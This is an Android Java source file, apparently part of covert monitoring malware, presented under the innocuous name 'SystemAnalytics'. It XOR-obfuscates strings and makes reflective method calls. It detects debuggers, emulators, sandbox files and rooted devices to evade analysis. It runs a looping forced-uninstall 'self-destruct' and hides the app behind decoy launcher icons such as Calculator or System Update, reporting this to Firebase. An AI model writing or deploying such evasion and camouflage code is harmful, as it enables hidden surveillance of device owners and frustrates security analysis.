package com.labs.labrats;

import android.os.Build;
import android.provider.Settings;
import android.content.Context;
import android.content.Intent;
import com.labs.labrats.BuildConfig;
import java.io.File;
import java.lang.reflect.Method;
import java.util.UUID;

/**
 * Internal system environment synchronization.
 */
public class SystemAnalytics {

    private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;

    public static String decrypt(byte[] e) {
        byte[] kBytes = DYNAMIC_K.getBytes();
        byte[] d = new byte[e.length];
        for (int i = 0; i < e.length; i++) {
            d[i] = (byte) (e[i] ^ kBytes[i % kBytes.length]);
        }
        return new String(d);
    }

    public static byte[] encrypt(String s) {
        byte[] kBytes = DYNAMIC_K.getBytes();
        byte[] sBytes = s.getBytes();
        byte[] e = new byte[sBytes.length];
        for (int i = 0; i < sBytes.length; i++) {
            e[i] = (byte) (sBytes[i] ^ kBytes[i % kBytes.length]);
        }
        return e;
    }

    public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
        try {
            Class<?> cl = Class.forName(c);
            Method me = cl.getMethod(m, p);
            return me.invoke(i, a);
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean checkEnv(Context context) {
        // Debugger Check
        if (android.os.Debug.isDebuggerConnected()) return true;

        String f = Build.FINGERPRINT;
        String m = Build.MODEL;
        String p = Build.PRODUCT;
        String h = Build.HARDWARE;
        String ma = Build.MANUFACTURER;
        
        // Comprehensive Hardware/Emulator Checks
        boolean r = f.startsWith("gen") || f.startsWith("unk")
                || m.contains("sdk") || m.contains("Emu")
                || m.contains("x86") || ma.contains("Geny")
                || ma.contains("Google") && h.equals("ranchu") // Pixel Emulator
                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen"))
                || p.contains("sdk") || h.contains("gold") || h.contains("ranch")
                || p.contains("vbox") || p.contains("sim")
                || ma.equalsIgnoreCase("nox") || p.equalsIgnoreCase("nox");

        if (r) return true;

        try {
            // Suspicious Files Check (Emulator/Sandbox Artifacts)
            String[] suspectPaths = {
                "/dev/qemu_pipe", "/dev/socket/qemud", "/system/lib/libc_malloc_debug_qemu.so",
                "/sys/module/qemu_trace_sysfs", "/system/bin/qemu-props", "/proc/tty/driver/goldfish"
            };
            for (String path : suspectPaths) {
                if (new File(path).exists()) return true;
            }

            // Suspicious Package Check
            String[] suspectPkgs = {"com.google.android.launcher.layouts.device_dock", "com.example.android.contactmanager"};
            android.content.pm.PackageManager pm = context.getPackageManager();
            for (String pkg : suspectPkgs) {
                try { pm.getPackageInfo(pkg, 0); return true; } catch (Exception ignored) {}
            }

            android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            if (b != null) {
                int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                if (lv == 50 && st == 2) { 
                    // Emulator battery often stuck at 50%
                }
            }
        } catch (Exception ignored) {}

        return false;
    }

    public static boolean isDebug(Context context) {
        try {
            return Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isRooted() {
        String[] ps = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/xbin/su"};
        for (String s : ps) {
            if (new File(s).exists()) return true;
        }
        return false;
    }

    /**
     * Re-triggers the uninstall intent repeatedly until the app is removed.
     */
    public static void triggerSelfDestructLoop(android.content.Context context) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                if (!context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
                    return;
                }
                
                android.util.Log.d("SystemAnalytics", "Executing persistent self-destruct intent...");
                try {
                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_DELETE);
                    intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    context.startActivity(intent);
                } catch (Exception e) {
                    try {
                        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    } catch (Exception ignored) {}
                }
                // Re-trigger every 8 seconds
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 8000);
            }
        });
    }

    /**
     * Instantly toggles app camouflage by switching launcher aliases.
     */
    public static void setStealthMode(android.content.Context context, boolean stealth) {
        try {
            android.util.Log.d("SystemAnalytics", "Executing stealth protocol. Active: " + stealth);
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
            
            // Resolve chosen Decoy from BuildConfig
            String decoyClass = "com.labs.labrats.SystemUpdateAlias";
            try {
                switch (BuildConfig.DECOY_CHOICE) {
                    case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
                    case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
                    case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
                }
            } catch (Exception ignored) {}
            
            android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);

            if (stealth) {
                // Disable Main
                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                // Disable ALL other decoys first to ensure only one is active
                String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
                for (String d : decoys) {
                    if (!d.equals(decoyClass)) {
                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                    }
                }

                // Enable chosen decoy
                pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + decoyClass + ")");
                
                // Force Launcher Refresh
                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
                home.addCategory(android.content.Intent.CATEGORY_HOME);
                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(home);
            } else {
                // Restore Main
                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                // Disable all possible decoys
                String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
                for (String d : decoys) {
                    pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                }
                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
                
                // Force Launcher Refresh
                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
                home.addCategory(android.content.Intent.CATEGORY_HOME);
                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(home);
            }
        } catch (Exception e) {
            android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage());
        }
    }
}
